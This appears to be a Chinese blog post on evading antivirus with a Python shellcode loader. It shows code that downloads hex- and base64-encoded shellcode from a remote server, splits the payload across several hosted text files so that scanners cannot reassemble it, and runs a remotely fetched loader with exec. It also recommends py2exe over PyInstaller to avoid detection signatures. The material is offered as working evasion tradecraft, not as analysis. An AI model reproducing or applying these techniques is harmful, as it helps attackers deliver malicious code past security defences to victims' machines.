前几文补充
=====

前几文忘记标注python环境了，环境不同会导致很多问题的。。。

python2.7

pyinstaller3.0

```php
pip install pyinstaller==3.0
```

生成exe文件也可以用py2exe打包，因为pyinstaller很多特征也被标记恶意了。。。。

shellcode编码
===========

shellcode实际上是一段操作代码，计算机实现特定恶意功能的机器码转换成16进制

我是将shellcode生成后，经hex编码，再b ase64编码，放在了服务器123.txt文件上

然后loader访问该文件即可

```php
scode = requests.get("http://192.168.1.1/123.txt")
shellcode = bytearray(b ase64.b64decode(scode.text).decode('hex'))
```

只要你的IP或URL没有被标记恶意网站或c2服务器，基本是不会拦截访问的。

但是
--

我们还是怕被检测到访问的是恶意代码，这里就萌生了我之前php免杀的思路《拆分代码》

将编码后的代码，分成几段，放在服务器上不同文件上

由于是单个单个访问代码的部分片段，杀软没这本事将所有片段拼起来再检测有没有恶意。

举例
--

将b ase64代码分成两段放在服务器1.txt，2.txt

然后加载将文本拼接起来，解码就得了

```php
scode1 = requests.get("http://192.168.1.1/1.txt")
scode2 = requests.get("http://192.168.1.1/2.txt")

shellcode = bytearray(b ase64.b64decode(scode1.text+scode2.text).decode('hex'))
```

或者将b代码分成三段,然后分别进行b ase64编码

```php
scode1 = requests.get("http://192.168.1.1/1.txt")
scode2 = requests.get("http://192.168.1.1/2.txt")
scode3 = requests.get("http://192.168.1.1/3.txt")

shellcode = bytearray((b ase64.b64decode(scode1.text)+b ase64.b64decode(scode2.text)+b ase64.b64decode(scode3.text)).decode('hex'))
```

自己搞个加密方式，加密后上传服务器也行。

这些就比较随心所欲了，怎么拆分的逆着怎么还原就行。

同理，如果你的loader也是放在服务器上的，可以相同方式加载然后exec执行。

就记住一点杀软没这本事将所有片段拼起来再检测有没有恶意，就算是人工溯源也够他喝一壶的了。